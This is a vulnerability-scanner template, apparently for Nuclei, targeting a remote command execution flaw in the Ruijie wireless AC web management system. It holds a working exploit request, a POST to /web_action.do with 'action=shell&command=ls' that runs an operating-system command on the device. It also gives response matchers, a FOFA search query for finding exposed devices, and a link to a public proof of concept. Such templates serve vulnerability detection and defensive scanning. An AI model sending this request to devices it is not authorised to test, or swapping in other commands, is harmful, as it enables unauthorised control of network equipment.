id: ruijie-ac-web-action-rce

info:
  name: 锐捷AC web.action - Remote Code Execution
  author: qwtd
  severity: critical
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C%E6%97%A0%E7%BA%BFAC%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md
  tags: Ruijie-EWEB网管系统
  metadata:
    fofa-query: body="syspar.js"
  
http:
  - raw:
      - |
        POST /web_action.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

        action=shell&command=ls

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "webcli-print"
          - "return-code"
          - "return-desc"
        condition: and

      - type: status
        status:
          - 200